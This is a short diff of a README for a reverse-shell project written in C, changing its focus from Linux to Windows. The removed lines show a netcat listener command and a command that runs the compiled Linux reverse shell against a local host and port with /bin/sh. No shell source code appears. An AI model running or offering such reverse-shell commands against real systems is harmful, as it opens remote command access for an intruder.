@@ -1,22 +1,11 @@
 # Concept
 
-Making a Reverse Shells in C for Linux
+Making a Reverse Shells in C for Windows
 
-## Linux
-### Compiling & Usage
+# compilation
 
 ```bash
-# Compile it
-gcc -o linux_rev_shell.elf linux_rev_shell.c
-
-## Another system:
-## set up a listener 
-nc -nvlp -k 1234
-
-## Set up env variables for easy execution in terminal
-# Execute it, passing the env variables.
-RP="1234" && RH="127.0.0.1" && BIN="/bin/sh"  && ./linux_rev_shell.elf $RP $RH $BIN
-
+$ make
 ```
 
 ## TODO 
